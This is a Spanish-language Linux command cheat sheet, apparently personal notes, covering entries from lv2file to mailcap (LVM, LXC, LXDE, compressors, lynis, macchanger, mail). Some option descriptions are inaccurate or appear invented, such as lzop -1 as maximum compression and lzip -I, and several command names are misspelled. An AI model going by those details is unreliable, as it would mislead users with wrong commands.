$ lv2file -i musica.flac -o musica_eq.flac http://calf.sourceforge.net/plugins/FiveBandEQ (aplicar un ecualizador de 5 bandas de Calf a un archivo llamado musica.flac)
$ lv2file -i musica.flac -o musica_eq_ajustado.flac http://calf.sourceforge.net/plugins/FiveBandEQ -p gain1 5.0 -p gain5 4.5 (ajusta el ecualizador para realzar los bajos, banda 1 y los agudos, banda 5)
$ lv2info http://calf.sourceforge.net/plugins/Reverb (muestra información detallada sobre el plugin Calf Reverb)


lvm2
[Logical Volume Manager 2]. Administrador de Volúmenes Lógicos de Linux.
# pvcreate /dev/sdX (crear un volumen físico [PV] a partir de una partición o disco)
# vgcreate nombre_vg /dev/sdX (crear un grupo de volúmenes [VG] con el nombre que se da al grupo de volúmenes y el volumen físico que se desea agregar)
# lvcreate -L 10G -n nombre_lv nombre_vg (crear un volumen lógico dentro de un grupo de volúmenes)
"-L 10G" especifica el tamaño del volumen lógico, "-n nombre_lv" nombre que se da al volumen lógico y "nombre_vg" nombre del grupo de volúmenes.
Una vez creado el volumen lógico, puede formatearse y montarlo como un sistema de archivos normal. Por ejemplo, para formatearlo como ext4 y montarlo en /mnt/nombre_lv:
# mkfs.ext4 /dev/nombre_vg/nombre_lv
# mkdir /mnt/nombre_lv
# mount /dev/nombre_vg/nombre_lv /mnt/nombre_lv
Una de las ventajas de LVM es la capacidad de redimensionar volúmenes lógicos sin perder datos.
# lvextend -L +5G /dev/nombre_vg/nombre_lv (aumentar el tamaño de un volumen lógico 5 GB)
# sudo resize2fs /dev/nombre_vg/nombre_lv (redimensionar el volumen lógico)
# lvremove /dev/nombre_vg/nombre_lv (eliminar un volumen lógico)
# vgremove nombre_vg (eliminar un grupo de volúmenes, al que primero se eliminado todos los volúmenes lógicos dentro de él)
# pvremove /dev/sdX (eliminar un volumen físico al que primero se ha eliminado cualquier grupo de volúmenes al que pertenezca)


lwatch
Herramienta para monitorear y analizar logs en sistemas que usan syslog o syslog-ng con expresiones regulares [PCRE], colorearlos y mostrarlos de forma que la información importante se pueda ver a simple vista.
$ lwatch /var/log/syslog (monitorear logs en tiempo real similar a tail -f pero con colores)
$ lwatch /var/log/syslog -o salida.log (guardar salida en un archivo.)
Se puede crear un archivo de configuración para definir reglas permanentes:
$ nano ~/.lwatchrc
        [default]
        grep = "error|fail|denied"
        color = "error=red:fail=bold,yellow:denied=bold,red"
        fields = "date,time,message"


lwm
Gestor de ventanas ligero. Utiliza un mínimo de bibliotecas externas, por lo que consume muy poca memoria y no incluye iconos, documentación de iconos, barras de botones ni menús raíz.


lxc
[Linux Containers]. Herramientas del espacio de usuario de contenedores de Linux. Los contenedores son áreas aisladas dentro de un sistema que cuentan con su propio espacio de nombres para el sistema de archivos, la red, el PID, el IPC, la CPU y la asignación de memoria. Incluye las herramientas lxc-attach, lxc-autostart, lxc-cgroup, lxc-checkconfig, lxc-checkpoint, lxc-config, lxc-console, lxc-copy, lxc-create, lxc-destroy, lxc-device, lxc-execute, lxc-freeze, lxc-info, lxc-ls, lxc-monitor, lxc-snapshot, lxc-start, lxc-stop, lxc-top, lxc-unfreeze, lxc-unpriv-attach, lxc-unpriv-start, lxc-unshare, lxc-update-config, lxc-usernsexec y lxc-wait, que permiten iniciar un único demonio en un contenedor o arrancar un sistema contenedorizado completo, así como administrar y depurar los contenedores.
# lxc-create -t debian -n mycontainer (crea un contenedor llamado basado en la plantilla de Debian)
$ ls /usr/share/lxc/templates/ (listar plantillas)
# lxc-copy -n mycontainer -N mycontainer-clone (crea una copia del contenedor mycontainer llamada mycontainer-clone)
# lxc-destroy -n mycontainer (elimina el contenedor mycontainer permanentemente)
# lxc-snapshot -n mycontainer (crea un snapshot del contenedor mycontainer)
# lxc-snapshot -n mycontainer -r snap0 (restaurar un contenedor al que se habia creado un snapshot)
# lxc-start -n mycontainer (inicia el contenedor mycontainer en segundo plano)
# lxc-start -n mycontainer -F (ejecutarlo en primer plano)
# lxc-stop -n mycontainer (detiene el contenedor)
# lxc-execute -n mycontainer -- /bin/bash (ejecuta un shell en mycontainer sin iniciar todo el sistema)
# lxc-attach -n mycontainer (accede al contenedor y ejecuta un comando o shell)
# lxc-console -n mycontainer (conecta a la consola del contenedor)
# lxc-freeze -n mycontainer (pausa todos los procesos del contenedor)
# lxc-unfreeze -n mycontainer (reanuda los procesos de mycontainer)
# lxc-ls --fancy (muestra una tabla con los nombres, estados, direcciones IP y otra información de los contenedores)
# lxc-info -n mycontainer (muestra el estado, PID, uso de recursos, etc., del contenedor mycontainer)
# lxc-monitor -n mycontainer (muestra eventos como inicio, detención o cambios de estado en mycontainer)
# lxc-top (muestra el uso de recursos [CPU, memoria...] de los contenedores en tiempo real)
# lxc-config -n mycontainer lxc.network.type (muestra el tipo de red configurado para mycontainer)
# lxc-update-config -n mycontainer (actualiza el archivo de configuración de mycontainer)
# lxc-cgroup -n mycontainer memory.limit_in_bytes 256M (limita la memoria del contenedor mycontainer a 256 MB)
# lxc-checkconfig (muestra si el kernel tiene habilitadas las características necesarias para LXC)
$ lxc-unpriv-attach -n myunprivcontainer (accede a un contenedor no privilegiado)
$ lxc-unpriv-start -n myunprivcontainer (inicia un contenedor no privilegiado(
$ lxc-usernsexec -m u:0:1000:1 -- /bin/bash (ejecuta un shell en un namespace con mapeo de usuario)
$ lxc-unshare -s MOUNT -- /bin/bash (ejecuta un shell en un namespace de montaje aislado)
# lxc-autostart (inicia todos los contenedores con la configuración lxc.start.auto=1)
# lxc-wait -n mycontainer -s RUNNING (espera hasta que mycontainer esté en ejecución)
# lxc-device -n mycontainer add /dev/ttyUSB0 (añade el dispositivo /dev/ttyUSB0 al contenedor mycontainer)
# lxc-checkpoint -n mycontainer (crea un checkpoint de mycontainer)
# lxc-checkpoint -n mycontainer -r (restaurarlo)
Para que un contenedor use un puente de LXD
# nano /var/lib/lxc/myhybridcontainer/config
        lxc.net.0.type = veth
        lxc.net.0.link = mybridge
        lxc.net.0.flags = up
Nota.- Los archivos de configuración de los contenedores están en /var/lib/lxc/<nombre>/config para contenedores privilegiados o ~/.local/share/lxc/<nombre>/config para no privilegiados.


lxc-tests
Binarios de prueba para contenedores de Linux. Los contenedores son áreas aisladas dentro de un sistema que cuentan con su propio espacio de nombres para el sistema de archivos, la red, el PID, el IPC, la CPU y la asignación de memoria. Estos binarios se utilizan principalmente para autopkgtest y por algunos desarrolladores y no están diseñados para instalarse en sistemas de usuario estándar. Incluye casi una sesentena de comandos.


lxcfs
[lxc lxd lxcfs]. Sistema de archivos virtual basado en FUSE que mejora la experiencia de los contenedores proporcionando vistas aisladas de ciertos recursos del sistema como /proc o /sys. Esto permite que los contenedores vean información de recursos, CPU, memoria, etc. como si fueran sistemas independientes, en lugar de reflejar los del host por ejemplo, en un contenedor sin LXCFS, /proc/cpuinfo muestra los CPUs del host, mientras que con LXCFS muestra solo los asignados al contenedor. El comando se instala como un servicio [lxcfs.service] y se monta automáticamente en los contenedores para proporcionar estas vistas aisladas.
# systemctl enable lxcfs.service (iniciar el servicio)
$ echo "lxc.mount.entry = /var/lib/lxcfs proc proc rw,nosuid,nodev,noexec 0 0" | sudo tee -a /var/lib/lxc/mylxccontainer/config (configurar el contenedor para usar LXCFS)
# lxc exec mylxdcontainer -- bash (abrir un shell dentro del contenedor...)
# cat /proc/meminfo (... y verificar que solo se vea la memoria asignada al contenedor)


lxctl
Permite controlar contenedores basados en LXC y gestionar diferentes aspectos como la creación, la destrucción, el inicio y la detención de contenedores. Obsoleto y no recomendado en sistemas modernos. Usar lxc o lxd en su lugar.


lxd
Es un gestor de contenedores de sistemas y máquinas virtuales de última generación. Se basa en imágenes prediseñadas disponibles para una amplia variedad de distribuciones de Linux y se basa en una API REST muy potente y sencilla. Este paquete contiene el demonio LXD.
# lxd init (inicializa el daemon)


lxde
Escritorio ligero. Sus componentes:
	pcmanfm (gestor de archivos)
	lxlauncher (lanzador de aplicaciones)
	lxpanel (panel de escritorio)
	lxsession-edit (cambiar el gestor de ventanas y las aplicaciones ejecutadas al inicio)
	lxsession  (gestor de sesiones con las opciones cerrar, reiniciar y suspender)
	lxappearance  (gestor de temas. Permite cambiar el aspecto, iconos  y tipografías)
	leafpad (editor de texto)
	xarchiver  (gestor de archivos comprimidos)
	gpicview (visor de imágenes)
	lxterminal (Consola)
	lxtask  (administrador de tareas y monitor de sistema)
	openbox  (gestor de ventanas)
	lxrandr (gestor de resolucaión de pantalla y monitores externos)
	lxshortcut (editor de lanzadores)
	lxmusic (reproductor de música basado en xmms2)
Archivos de configuración de los elementos del escritorio lxde:
	~/.config/gtkrc-2.0 (Temas de escritorio GTK+ e iconos)
	~/.config/leafpad/leafpadrc (Editor de textos Leafpad)
	~/.config/lxpanel/LXDE/panels/panel (Paneles)
	~/.config/lxpanel/LXDE/config (Lanzadores de aplicaciones del panel)
	~/.config/lxsession/LXDE/config (Administrador de ventanas)
	~/.config/lxterminal/lxterminal.conf (Terminal)
	~/.config/openbox/lxde-rc.xml (Openbox)
	~/.config/openbox/menu.xml (Menu de Openbox)
	~/.config/pcmanfm/main.lxde (Pcmanfm)
1.-
Arrancar aplicaciones al inicio:
# /etc/xdg/lxsession/LXDE/autostart
Colocar las aplicaciones precedidas de una @:
	@liferea
	@gdesklets
2.-
Crear iconos en el escritorio:
Colocar los archivos en la carpeta Desktop o Escritorio si se tiene en español:
$ nano Desktop/home.lnk
Y colocamos el siguiente contenido de ejemplo:
	[Desktop Entry]
	Name=Personal
	Type=Application
	Comment=Carpeta personal
	Terminal=false
	Exec=pcmanfm ~/
	Icon=folder_home.png
	Encoding=UTF-8
Para colocar la papelera:
	$ nano Desktop/papelera.lnk
	Y pegar el contenido:
	[Desktop Entry]
	Name=Papelera
	Type=Application
	Comment=Papelera
	Terminal=false
	Exec=pcmanfm trash:///
	Icon=emptytrash.png
	Encoding=UTF-8
3.-
Modificar iconos:
$ ls /usr/share/icons/ (Ver el listado de los disponibles)
# nano  /usr/share/icons/default/index.theme
Y en apartado Inherits colocar el deseado:
Inherits = ComixCursors-Red-Large
Reiniciar.
4.-
Para no cambiar de escritorio con movimientos del mouse comentar el siguiente código del lxde-rc.xml con <!-- y -->:
      <!--
      <mousebind button="Up" action="Click">
        <action name="DesktopPrevious"/>
      </mousebind>
      <mousebind button="Down" action="Click">
        <action name="DesktopNext"/>
      </mousebind>
      -->
5.-
Si queremos que alguna aplicación se abra en determinado escritorio:
$ nano .config/openbox/lxde-rc.xml
Colocar el siguiente código en el apartado applications:
	<application class="Firefox">
		<desktop>2</desktop>
	</application>
Esto abrirá firefox en el escritorio 2
6.-
Para arrancar el sistema sin colocar la contraseña:
# nano /etc/lightdm/lightdm.conf
Y en el apartado [base] descomentamos la linea:
  autologin=usuario
7.-
Para suprimir la decoración de las terminales:
Suprimir solo para lxterminal
$ nano /home/pep/.config/openbox/lxde-rc.xml
Y en el apartado <applications> [la última parte del archivo] colocar
        <application class="Lxterminal">
          <name>lxterminal</name>
          <decor>no</decor>
        </application>
Para suprimir la decoración de todas las shells. colocar estas otas lineas:
        <application class="*">
          <decor>no</decor>
        </application>
<application name="primer elemento de la propiedad WM_CLASS de la ventana de xprop"
class="segundo elemento de la propiedad WM_CLASS de la ventana de xprop"
$ openbox --restart


lxlock
Bloquea la sesión del usuario usando el protector de pantalla. Entrando la contraseña se desbloquea.
$ lxlock


lxpanel
Aplicación GUI para el entorno de escritorio ligero X11 LXDE. Incluye la herramienta lxpanelctl.
Crear nuevo directorio en el menú de aplicaciones
# nano /usr/share/desktop-directories/lxde-cli.directory
Y añadir el liguiente texto:
        [Desktop Entry]
         Name=cli
         Comment[es]=Comandos de consola
         Icon=/home/USER/images/logos/icons/tux.png
         Type=Directory
Nombre del nuevo directorio, un comentario y el icono que emplearemos
# nano /etc/xdg/menus/lxde-applications.menu
<!-- cli -->
        <Menu>
               <Name>cli</Name>
               <Directory>lxde-cli.directory</Directory>
               <Include>
                       <And>
                               <Category>cli</Category>
                               <Not><Category>Utility</Category></Not>
                       </And>
               </Include>
        </Menu> <!-- End cli -->
$ lxpanelctl restart (la nueva entrada todavía no aparecerá en el menú ya que no tiene ninguna aplicación entrada)
Entrar la primera aplicación en el nuevo menú [cli], por ejemplo que se ejecute "grc ip a" ["grc" es para darle más colorido]
$ nano ip.desktop
        [Desktop Entry]
        Encoding=UTF-8
        Type=Application
        Name=ip
        Categories=cli
        Icon=/home/pep/Imatges/logos/icons/ip.png
        Exec=urxvt -g 100x20 -hold -e sh -c "grc ip a"
        Comment=Saber la ip del sistema
        StartupNotify=true
$ lxpanelctl restart (recargar la configuración)
$ lxpanelctl menu (comprobar que "cli" sale en el menú y que en él existe la aplicación "ip" y que acercando el puntero muestra eñ "comment")


lxterminal
Emulador de terminal basado en VTE para el entorno de escritorio ligero X11 [LXDE].
Algunos ajustes del archivo de configuración
$ nano ~/.config/lxterminal/lxterminal.conf
        [general]
        fontname=Comic Mono 12
        selchars=-A-Za-z0-9,./?%&#:_
        scrollback=1000
        bgcolor=rgb(0,0,0)
        fgcolor=rgb(170,170,170)
        ...
        color_preset=VGA
        disallowbold=true
        boldbright=true
        cursorblinks=true
        cursorunderline=false
        audiblebell=false
        visualbell=false
        tabpos=top
        geometry_columns=100
        geometry_rows=24
        hidescrollbar=true
        hidemenubar=true
        hideclosebutton=true
        hidepointer=true
        disablef10=false
        disablealt=false
        disableconfirm=false
        undecorate=true
        decor=no
$ lxterminal --geometry=150x34 (lanzarla con una geometria concreta)
$ lxterminal --geometry=105x15 -e 'bash -c "ip a; read"' (lanzarla para ejecutar un comando y esperar a pulsar "intro" para cerrarla)
$ lxterminal -e "bash -c 'ip a; bash'" (se lanza para ejecutar un comando pero continua la aplicación abierta)
$ lxterminal -e "/bin/bash -c 'ip a; read -n 1 -s'" (ejecutar comando y esperar a pulsar una tecla para cerrarse la aplicación)
$ lxterminal --tabs=tab_name1,tab_name2,tab_name3 (abrir la terminal con 3 pestañas con sus nombres cada una)
$ lxterminal --title=title_name (con un título)
$ lxterminal --working-directory=/home/USER/Documentos (brir la terminal en un directorio especifico)


lynis
Busca en el sistema posibles debilidades de configuración sin realizar ninguna modificación.
# lynis (Visualizar las opciones)
# lynis audit system --forensics (análisis forenses en un sistema en ejecución o montado)
# lynix audit system --pentest (muestra puntos de interés para pruebas de penetración)
# lynis audit system remote <host> (Análisis de seguridad remoto)
# lynis show (ver todos los argumentos adicionales)
# lynis show tests (alguno de los argumentos del listado anterior. Ver todos los chequeos que realiza)
# lynis update info (descargar actualizaciones)
# cat /var/log/lynis.log | grep Warning (ver las vulnerabilidades)
# cat /var/log/lynis.log | grep Suggestion (ver sugerencias que nos realiza lynis)


lynx
Navegador web por consola.
$ lynx -dump http://www.tuxapuntes.com | grep Enviado  (Ver las últimas entradas en la web especificada)
$ lynx -dump http://www.tuxapuntes.com | grep Enviado | grep templix (Ver si entre las últimas entradas hay alguna del usuario templix)
$ lynx -source http://www.tuxapuntes.com (ver el codigo fuente)
$ lynx -dump http://checkip.dyndns.com | cut -d ' ' -f7 (mostrar IP externa)
$ lynx -dump http://www.tuxapuntes.com | awk '/http/{print $2}' | egrep "^https{0,1}"   (ver todos los enlaces de una web)
$ lynx -dump http://www.lapipaplena.com/ | awk '/http/{print $2}' | sort -  (Lo mismo)


lz4
Comprimir y descomprimir ficheros.
$ lz4 file (forma básica para comprimir un fichero)
$ lz4 -d file.lz4 (descomprimir)
$ lz4 -t file.lz (test de integridad de un archivo comprimido)


lz4json
Utilidad destinada a descomprimir archivos en formato lz4json, un tipo de compresión utilizado principalmente por productos de Mozilla como Firefox para sus marcadores y archivos de restauración de sesiones. El formato lz4json es especial: contiene un encabezado específico y no es compatible con la mayoría de utilidades estándar de lz4; por eso, para leer archivos como recovery.jsonlz4 o bookmarks-YYYY-MM-DD_XXXX_fx_bookmarkbackup.jsonlz4, se requiere una herramienta dedicada como lz4json.
$ lz4jsoncat somefile.mozlz4 > somefile.json


lzd
Descompresor para archivos lzip.
$ lzd < archivo.lz > descomprimido


lzip
Compresor de archivos que utiliza la técnica de compresión LZMA2 y ofrece una alta compresión sin pérdida de datos. Lzip descomprime casi tan rápido como gzip y comprime mejor que bzip2.
$ lzip archivo.txt (comprimirá el archivo archivo.txt en un archivo llamado archivo.txt.lz)
$ lzip archivo1.txt archivo2.txt archivo3.txt (Comprimir todos los archivos especificados en archivos comprimidos con sufijo .lz)
$ echo "linux es sistema genial" | lzip - (comprimir la salida)
$ lunzip archivo.txt.lz (descomprimir)
$ lzip --test archivo.txt.lz (verificar si el archivo comprimido está intacto)
$ lzip -I archivo.txt (permitir interactivamente seleccionar qué partes del archivo se comprimen)
$ lzip -9 archivo.txt (usa el nivel más alto de compresión)
$ lzip -e archivo.txt (comprimir y eliminar original)


lziprecover
Herramienta de recuperación de datos y descompresor para archivos en formato lzip [.lz] que también ofrece corrección de errores de reenvío [FEC], capaz de reparar cualquier tipo de archivo.
$ lziprecover -cd --ignore-errors file.lz > file (Si un archivo está demasiado dañado como para que lziprecover lo repare, se extraen todos los datos recuperables)
Nota.- El archivo resultante puede contener errores y generar datos innecesarios. Los archivos dañados se coservan sin cambios


lzma
Compresor/descompresor de archivos. Formato de salida .lzma
$ lzma fichero.txt (Substituye fichero.txt por fichero.txt.lzma)
$ lzma -d fichero.txt.lzma (Descomprimir)


lzop
Es un compresor similar a gzip. Sus principales ventajas sobre gzip son una velocidad de compresión y descompresión mucho mayor.
$ lzop -1 -o salida.lzo archivo (comprimir archivo a la máxima compresión [preterminado 3] y guardarlo en salida.jz)
$ lzop -t solida.lzo (comprobar la integridad de un archivo .lz)
$ lzop -l solida.lzo (enumerar de un comprimido los siguientes campos: method, compressed, uncompressed, ratio y uncompressed_name)
$ lzop -df solida.lzo (descomprimir y sobreescribir si existe)


m2r
Convierte un archivo Markdown [md], a reStructuredText [rst]
$ m2r --dry-run archivo.md  (mustra el resultado sin guardar)
$ m2r --overwrite archivo.md (genera archivo.rst y si existe lo sobreescribe)


m4
Lenguaje de procesamiento de macros y preprocesador de texto. Es como un mini lenguaje que toma un texto y lo transforma antes de pasarlo a otro programa, compilarlo, etc.
1.-
$ nano ejemplo.m4
        define(`saludo', `Hola, mundo!')
        saludo
$ m4 ejemplo.m4 (ejecutarlo)
2.-
Macros con parámetros
$ nano ejemplo.m4
        define(`cuadrado', `eval($1 * $1)')
        cuadrado(7)
3.-
Macros anidadas [convierte las vocales en mayúsculas]
$ nano ejemplo.m4
define(`grito', `translit($1, aeiou, AEIOU)!!')
grito(`este texto es importante')


mac-robber
Herramienta de análisis forense que recopila metadatos de archivos en un sistema de archivos montado para obtener información adicional, como quién los creó, cuándo fueron modificados, permisos, atributos extendidos, etc.
$ mac-robber /mnt/usbdrive (analizar un sistema de archivos montado)
$ mac-bobber /home/USER (analizar el directorio personal)


macchanger
Modificar la MAC
# macchanger -s eth0 (Muestra la MAC)
# macchanger -m 00:01:02:03:04:05 eth0  (poner la tarjeta de red a la escucha por la interfaz eth0 con la MAC especificada)
# macchanger -A eth0 (Establece proveedor MAC aleatorio)
# macchanger -r eth0  (MAC completamente aleatoria)
# macchanger -l  (Listar los comienzos de las MAC de los principales fabricantes)
# macchanger –-list=Sony   (Muestra los comienzos de las MAC de Sony)


macfanctld
Daemon de control de ventiladores para ordenadores Apple MacBook/MacBook Pro. Lee los sensores de temperatura y los regula según corresponda para mantener la temperatura dentro de límites configurables.
# systemctl anable macfanctld (activar al inicio)


mactelnet-client
Herramientas de consola para telnet y ping mediante direcciones MAC. Herramientas de ping, descubrimiento y telnet para conectarse a dispositivos Mikrotik RouterOS u otros equipos/dispositivos con MAC-Telnet. Esta herramienta puede comunicarse a través de la red de área local mediante paquetes UDP con una dirección MAC como destino. Puede usar telnet en equipos Linux que tengan instalado mactelnet-server o en un dispositivo Mikrotik RouterOS. La ventaja de usar MAC-Telnet es que se puede conectar a un dispositivo incluso si no tiene una dirección IP configurada o si su configuración de red es incorrecta.
$ mactelnet-client 00:1A:2B:3C:4D:5E (conectarse a un router MikroTik que todavía no tiene dirección IP configurada usando la dirección MAC)


mactelnet-server
Daemon Telnet para aceptar conexiones mediante direcciones MAC. Este es un daemon Telnet que utiliza el protocolo MAC-Telnet, propiedad de Mikrotik. Este comando no es común para el uso diario, ya que la mayoría de los usuarios se conectan a un dispositivo de red y no al revés
$ mactelnet-server eth0 (conectar a la red a través de la interfaz eth0 y aceptar conexiones MAC-Telnet de otros dispositivos)
Nota.- Este comando se usa principalmente para pruebas o para escenarios de red muy específicos, ya que abrir un servidor de este tipo puede presentar riesgos de seguridad si no se gestiona correctamente.


macutils
Es un paquete que contiene varias utilidades para trabajar con archivos Macintosh en sistemas Unix, facilitando la conversión, transferencia, empaquetado y desempaquetado de archivos entre ambas plataformas. Incluye las aplicaciones binhex, frommac, hexbin, macsave, macstream, macunpack y tomac.
$ binhex archivo_origen archivo_destino.hqx (convierte archivos a formato BinHex, que codifica datos binarios a texto ASCII)
$ frommac > archivo_recibido (recibe archivos enviados desde un Macintosh a través de serie o red. Su uso principal hoy es histórico)
$ hexbin archivo.hqx (convierte archivos BinHex [.hqx] a su formato binario original)
$ macsave  flujo.macbin (extrae varios archivos de un flujo MacBinary y los guarda como archivos individuales)
$ macunpack archivo.sit (Desempaqueta archivos de los principales formatos de compresión y empaquetado clásicos de Mac: PackIt, StuffIt, Diamond, Compactor ...)
$ tomac archivo_unix archivo_mac (envía archivos desde Unix a Macintosh, preparándolos en formatos que el sistema Mac pueda entender)


madison-lite
Este programa inspecciona un archivo local de paquetes Debian y muestra las versiones de los paquetes de cada suite, por ejemplo, estable, en pruebas o inestable.
$ madison-lite emacs (saber qué versiones del paquete erspecificado están disponibles en las diferentes suites de Debian)
$ madison-lite sudo htop (consultar varios paquetes)
$ madison-lite -a arm64 gparted (filtrar por arquitectura)


madonctl
Cliente CLI para la API de la red social Mastodon. Para usar madonctl, se debe especificar el nombre o la URL de la instancia y nombre de usuario y contraseña de la cuenta o un token ya sea por argumentos del comando o por un archivo de configuración.
$ madonctl config dump -i mastodon.social -L username@domain -P password > config.yaml(generar un archivo de configuración)
O directamente en el archivo de configuración:
$ nano $HOME/.config/madonctl/madonctl.yaml
        instance: https://mastodon.social
	login: "USERNAME"
	password: "USERPASSWORD"


madplay
Reproductor de audio MPEG en punto fijo, basado en la librería MAD [libmad] por lo que funciona incluso en equipos sin FPU. MAD es un decodificador de audio MPEG. Su principal característica es que decodifica archivos MPEG, como MP3, usando aritmética de punto fijo, lo cual le permite funcionar en equipos que no tienen FPU [unidad de coma flotante], por ejemplo, computadoras antiguas o embebidas [las CPUs modernas generalmente incluyen la FPU].
$ madplay song.mp3 (reproducir un archivo)
$ madplay -v 0.5 song.mp3 (reproducir con menor volumen al 50%. El rango típico es de 0.0 [mute] a 1.0 [máximo volumen])
$ madplay song.mp3 -o raw:archivo.wav (convertir un MP3 a archivo WAV)
$ madplay cancion.mp3 --start=30 --stop=70 (reproducir solo una parte del archivo, desde el segundo 30 hasta el minuto 1:10)
$ madplay archivo1.mp3 archivo2.mp3 archivo3.mp3 (reproduce los archivos en el orden que aparecen)
$ madplay -v 0 cancion.mp3 (inicia el archivo completamente en silencio)


mage
Herramienta de compilación similar a Make escrita en Go, que permite tener múltiples Magefiles, nombrarlos como se desee y fáciles de personalizar para múltiples sistemas operativos. Mage no tiene dependencias, aparte de Go, y funciona correctamente en todos los sistemas operativos. A diferencia de Make, que a menudo depende de Bash, Mage funciona de manera nativa en todos los entornos.


magic-wormhole
Herramienta que permite transferir datos de un ordenador a otro utilizando una conexión cifrada de extremo a extremo [protocolp SPAKE2] que genera una clave segura a partir de un código corto y fácil de pronunciar. Este código, conocido como "código de agujero de gusano", es de un solo uso y sirve para autenticar la conexión entre el emisor y el receptor.
$ wormhole send documento.pdf (enviar un archivo)
La salida podría ser
        Sending 1.2 MB file named 'documento.pdf'
        Wormhole code is: 7-honest-horses
        On the other computer, please run:
        wormhole receive 7-honest-horses
        ...
Genera un código único, por ejemplo, "7-honest-horses" que se debe compartir con el receptor ya sea por chat, correo, llamada, etc. y el receptor con magic-wormhole instalado ejecuta:
$ wormhole receive 7-honest-horses (puede usar TAB después de escribir las primeras letras del código para autocompletar y el archivo se transfiere a su directorio actual)
$ wormhole receive 7-honest-horses --output-file /home/usuario/descargas/documento.pdf (guardar el envio en una carpeta concreta)
Nota.- magic-wormhole comprime automáticamente la carpeta en un archivo .tar.gz antes de enviarla.
$ wormhole send (el programa espera que se ingrese texto directamente en la terminal y finalizar con Ctrl+D)


magicfilter
Filtro automático de impresora personalizable y extensible que traduce los archivos que se envían a la impresora, PDF, PostScript, texto plano, imágenes, etc. a un lenguaje que esta pueda entender. Para lograrlo, determina el tipo de archivo que se va a imprimir y utiliza su conocimiento para convertirlo en un archivo imprimible generalmente PostScript o PCL. Incluye la herramienta magicfilterconfig.
# magicfilterconfig (inicia el asistente para configurar la impresora. Queda establecida en /etc/printcap)
$ cat documento.pdf | magicfilter -d psc_1100_series > /dev/lp0 (imprimir un archivo PDF con la impresora especificada)
Algunas opciones en el archivo de configuración
# /etc/magicfilter/multifuncional.cfg
DEVICE pcl
RESOLUTION 1200x600
# Para archivos PostScript
FILTER application/postscript /usr/bin/gs -q -dNOPAUSE -dBATCH -sDEVICE=pxlmono -sOutputFile=- -
# Para archivos PDF
FILTER application/pdf /usr/bin/pdftops - | /usr/bin/gs -q -dNOPAUSE -dBATCH -sDEVICE=pxlmono -sOutputFile=- -
# Para imágenes JPEG
FILTER image/jpeg /usr/bin/convert -density 300x300 - -resize 100% pxlmono:-


magicrescue
Recuperar archivos borrados
$ magicrescue -d /home/usuario/rescue -r /usr/share/magicrescue/recipes/avi /dev/sda3
Notas.-
-d .- Destino de los archivos recuperados
-r  .- Tipo de archivo a recuperar (formatos en /usr/share/magicrescue/recipes)
El último parametro indica el disco a analizar


mail
mandar correos en linea de consola.
$ mail -v usuario@gmail.com
	Subject: pruebas de mail
	Cuerpo del mensaje
	.    (el punto cierra el mensaje)
	Cc:   (intro)
	$
$ cat archivo.txt | mail -s "pruebas" usuario@gmail.com
$ echo "pepe" | mail -s "Asunto" usuario@gmail.com
$ echo "pepe" | mail -s "Asunto" usuario@dominio -c usuario2@dominio  -c usuario3@dominio  (con varios destinatarios)
-v .- muestra todo el proceso hasta el destinatario.
-s .- asunto del mail.
-b .- Enviar copias ocultas a la lista. Nombres separada por comas.
1.-
Como correo del sistema:
	$ mail (Muestra los correos del sistema)
	& (indica que estamos en el prompt del comando mail)
Opciones disponibles:
	d (borra el mensaje marcado con '>' en el listado)
        d 1-8 (Borra los mensajes del 1 al 8)
        d* (Borra todos los mensajes)
	? (listado de comandos disponibles)
	7 (muestra el mensaje 7)
	h (muestra la lista de mensajes)
	h 4 (muestra la lista de mensajes comenzando en el 4)
	q (sale de mail)


mail-expire
Herramienta que escanea las carpetas de correo [archivos Maildir o mbox] en busca de mensajes con una antigüedad superior a la establecida y los mueve a otro archivo mbox [comprimido] o simplemente los elimina.
$ mail-expire --delete --age=90 ~/Maildir/ (eliminar mensajes con más de 90 días en formato Maildir. Por defecto 30 dias)
$ mail-expire --delete --age=12w ~/mbox (eliminar mensajes con más de 12 semana en formato mbox. --age=6m --> 6 meses, --age=2y --> 2 años)
$ mail-expire --compress --age=180 --target=~/old-mail.mbox.gz ~/Maildir/ (mover correos de más de 180 días a un archivo comprimido)
$ mail-expire --delete --age=90 --dry-run ~/Maildir/ (ver qué se eliminaría sin ejecutar realmente)
$ mail-expire --delete --age=30 ~/Maildir/.Spam/ (procesar solo la carpeta de spam)
$ mail-expire --delete --age=60 ~/Maildir/cur ~/Maildir/.Sent/ (procesar múltiples carpetas)
$ mail-expire --delete --age=90 --max-size=1M ~/Maildir/ (eliminar correos antiguos y grandes >1MB)


mailagent
Agente de entrega de correo [MDA] que puede archivar correos en carpetas específicas [MMDF y MH], reenviar mensajes a terceros, canalizarlos a comandos o publicarlos en grupos de noticias. Existen alternativas más avanzadas y seguras de filtrado o procesamiento, como procmail, maildrop, o filtros Sieve, que ofrecen controles de seguridad y menor superficie de ataque.


mailcap
Asocia tipos de archivo MIME [Multipurpose Internet Mail Extensions] con los programas que pueden gestionarlos. Esto se hace a través de archivos de configuración del sistema (/etc/mailcap) y del usuario (~/.mailcap), donde se definen entradas que especifican comandos para acciones como ver, editar, imprimir o componer archivos de un tipo MIME específico. Incluye las aplicaciones, en este caso, alias al comando principal run-mailcap, pero con acciones predeterminadas: compose, edit, print, run-mailcap, see y update-mime
Una entrada en /etc/mailcap tiene este formato:
        text/plain; vim %s; needsterminal; test=command -v vim > /dev/null 2>&1
Nota.- needsterminal indica que los comandos deben ejecutarse en una terminal interactiva. No es una prueba; es un requisito del entorno en el que se ejecutará el programa y, por lo general, provocará la creación de una ventana de terminal cuando no se ejecute en una terminal real ni en una ventana de terminal.
Por ejemplo, supongamos que se quiere configurar el tipo MIME text/html para que se abra con el navegador de texto lynx:
$ nano ~/.mailcap
Y colocar la linea:
  text/html; lynx %s"
# update-mime (actualiza el archivo de configuración despues de modificaciones)
$ run-mailcap file.html (El sistema detectará que es un archivo text/html y lo abrirá con el programa asociado, en este caso lynx)
Si quisiéramos abrir los pdf con evince:
$ nano ~/.mailcap
Y poner la linea:
  application/pdf; evince %s
Si luego lanzáramos:
$ run-mailcap documento.pdf
El documento se abriria con evince
Si se quiere añadir instrucciones más complejas. Por ejemplo, que los archivos de imagen image/jpeg se abran con feh, pero también definir opciones adicionales:
$ nano ~/.mailcap
Y poner la linea:
image/jpeg; feh --auto-zoom --borderless %s
$ run-mailcap --test (verificar que el archivo mailcap está correctamente configurado)
$ compose archivo.txt (lo abrirá con vi si es el configurado)
